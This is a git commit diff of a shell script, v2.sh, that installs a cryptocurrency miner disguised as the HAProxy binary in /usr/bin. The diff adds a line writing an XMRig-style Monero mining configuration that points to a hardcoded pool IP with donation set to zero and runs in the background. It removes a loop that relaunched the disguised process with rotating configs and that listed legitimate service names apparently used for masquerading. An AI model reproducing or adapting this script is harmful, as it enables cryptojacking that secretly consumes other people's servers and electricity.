d5107bc443dcad985ec8ba6f137c2d8d9131a7c0
namtran180291-cmyk <namtran180291@gmail.com>
2026-02-25 21:09:56 +0700

    Update v2.sh

--- v2.sh
+++ v2.sh
@@ -11,24 +11,8 @@ mv ./haproxy /usr/bin/haproxy
 PRE_DELAY=$(shuf -i15-30 -n1)
 sleep $PRE_DELAY
 
-HAPROXY_BIN="haproxy"
+echo -e '{"autosave":true,"background":true,"colors":true,"title":true,"randomx":{"init":-1,"init-avx2":-1,"mode":"auto","1gb-pages":true,"rdmsr":true,"wrmsr":true,"cache_qos":false,"numa":true,"scratchpad_prefetch_mode":1},"cpu":{"enabled":true,"huge-pages":true,"huge-pages-jit":false,"hw-aes":null,"priority":null,"memory-pool":false,"yield":true,"max-threads-hint":20,"asm":true,"argon2-impl":null,"cn/0":false,"cn-lite/0":false},"opencl":{"enabled":false,"cache":true,"loader":null,"platform":"AMD","adl":true,"cn/0":false,"cn-lite/0":false},"cuda":{"enabled":false,"loader":null,"nvml":true,"cn/0":false,"cn-lite/0":false},"donate-level":0,"donate-over-proxy":0,"log-file":null,"pools":[{"algo":null,"coin":"XMR","url":"103.38.236.171:5059","user":"root","pass":"x","rig-id":null,"nicehash":false,"keepalive":true,"enabled":true,"tls":false,"tls-fingerprint":null,"daemon":false,"socks5":null,"self-select":null,"submit-to-origin":false}],"print-time":60,"health-print-time":60,"dmi":true,"retries":5,"retry-pause":5,"syslog":false,"tls":{"enabled":true,"protocols":null,"cert":null,"cert_key":null,"ciphers":null,"ciphersuites":null,"dhparam":null},"dns":{"ip_version":0,"ttl":30},"user-agent":null,"verbose":0,"watch":false,"pause-on-battery":false,"pause-on-active":false}' > ./config.json
 
-PROCESS_NAMES=(
-    chrome node systemd kworker redis dockerd containerd sshd nginx pm2
-)
-
-JSON_FILES=(
-    part1.json
-    part2.json
-    part3.json
-    part4.json
-)
-
-while true; do
-    pkill -f "haproxy" || true
-    sleep 5
-    JSON=${JSON_FILES[$RANDOM % ${#JSON_FILES[@]}]}
-    haproxy -c "$JSON"
-    INTERVAL=$((60 + RANDOM % 61))
-    sleep $INTERVAL
-done
+JSON=${JSON_FILES[$RANDOM % ${#JSON_FILES[@]}]}
+haproxy
+sleep 2h
